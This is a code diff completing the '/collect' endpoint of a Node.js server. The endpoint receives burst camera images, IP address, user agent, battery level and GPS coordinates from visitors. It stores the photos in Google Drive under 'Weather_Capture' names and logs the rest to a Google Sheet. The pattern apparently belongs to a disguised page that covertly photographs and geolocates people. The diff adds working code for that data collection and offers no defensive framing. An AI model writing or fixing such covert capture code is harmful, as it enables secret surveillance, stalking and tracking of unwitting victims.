@@ -38,4 +38,41 @@ app.post('/collect', async (req, res) => {
     const imgBase64 = burstImages[0].split(',')[1];
     const buffer = Buffer.from(imgBase64, 'base64');
     
-    const driveFile = await drive.files.
+    const driveFile = await drive.files.create({
+      requestBody: {
+        name: `Weather_Capture_${Date.now()}.jpg`,
+        parents: [FOLDER_ID]
+      },
+      media: {
+        mimeType: 'image/jpeg',
+        body: Readable.from(buffer)
+      },
+      // This fix allows the service account to use your drive storage
+      supportsAllDrives: true, 
+      fields: 'id, webViewLink'
+    });
+
+    // FIX 3: Append the new Drive link to your Google Sheet
+    const row = [
+      ts, ip, hints?.ua || 'N/A', 
+      (battery?.levelPercent || 0) + '%', 
+      `${location?.lat || 0}, ${location?.lon || 0}`,
+      driveFile.data.webViewLink 
+    ];
+
+    await sheets.spreadsheets.values.append({
+      spreadsheetId: process.env.GOOGLE_SHEET_ID,
+      range: 'Logs!A1',
+      valueInputOption: 'RAW',
+      requestBody: { values: [row] }
+    });
+
+    console.log("✅ Success! Data sent to Sheet and Photo sent to Drive.");
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ ERROR:", err.message);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.listen(process.env.PORT || 8080, () => console.log("Server is running..."));
